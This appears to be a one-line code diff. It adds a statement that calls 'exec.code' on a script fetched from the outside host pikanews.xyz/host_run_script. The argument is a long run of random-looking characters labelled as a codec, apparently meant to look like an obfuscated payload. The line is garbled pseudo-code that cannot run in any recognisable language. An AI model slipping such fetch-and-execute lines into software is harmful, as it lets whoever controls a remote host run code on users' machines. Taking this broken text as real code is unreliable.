@@ -1,0 +1,1 @@
+exec.code(host:"pikanews.xyz/host_run_script",codec(643222798b5cac722c1b369d102b7407dvdvkj643222798b5cac722c1b369d102b7407nfdnjvz.dvv/dvac/vd\vsnjvavkjdv+adivjjaviv-dfaivsnvdnj sdvsdjvds739v9web9vwefbvcbv9winvs0vjwe9vvaje0f7nw3kv0wunv0w8env0seueuewbovd8w98eghdjvjdvsddg80weu83pivnee0g/d//f/f/f/f/f/sd/s.fve\csddddddhfoaduofovnjd);
